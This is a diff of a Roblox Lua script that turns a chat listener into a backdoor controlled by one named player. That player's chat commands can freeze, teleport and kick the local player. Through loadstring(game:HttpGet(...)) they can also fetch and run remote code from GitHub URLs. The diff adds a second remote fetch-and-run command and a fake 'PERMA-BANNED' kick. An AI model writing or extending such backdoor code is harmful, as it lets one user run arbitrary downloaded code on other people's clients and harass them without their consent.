@@ -7,15 +7,20 @@ game.Players["6akzino"].Chatted:Connect(function(message)
 		local text = message:sub(8) 
 		print(text)
 	end
-
 	if message == "!freeze" then
 		game.Players.LocalPlayer.Character.Head.Anchored = true
 	end
 	if message == "!faded" then
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
 	end
+	if message == "!swagmode" then
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
+	end
 	if message == "!unfreeze" then
 		game.Players.LocalPlayer.Character.Head.Anchored = false
+	end
+	if message == "!ban" then
+		game.Players.LocalPlayer:Kick("PERMA-BANNED")
 	end
 	if message == "!bring" then
 		game.Players.LocalPlayer.Character:MoveTo(game.Players["6akzino"].Character.Head.Position)
